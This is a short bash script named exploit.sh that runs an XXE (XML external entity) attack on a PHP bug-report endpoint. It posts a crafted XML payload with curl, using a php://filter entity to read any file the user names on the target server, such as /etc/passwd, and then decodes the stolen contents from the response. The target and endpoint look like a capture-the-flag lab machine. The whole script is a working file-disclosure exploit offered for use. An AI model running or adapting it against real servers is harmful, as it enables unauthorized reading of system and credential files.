#!/bin/bash
## Made by: jd-apprentice
### Usage: ./exploit.sh <target> <file>
### Example: ./exploit.sh 10.10.11.100 /etc/passwd

target=$1
file=$2
endpoint="tracker_diRbPr00f314.php"
payload='<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource='$2'"> ]>
<bugreport>
<title>test</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>&file;</reward>
</bugreport>'

encoded_payload=$(echo -n $payload | base64 -w 0)

if [ -z $target ]; then
    echo "Usage: ./exploit.sh <target>"
    exit 1
fi

curl -X POST \
-H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
--data-urlencode "data='$encoded_payload'" "$target"/"$endpoint" \
| awk -F '[<>]' '/<td>Reward:/ {getline; print $3}' \
| base64 -d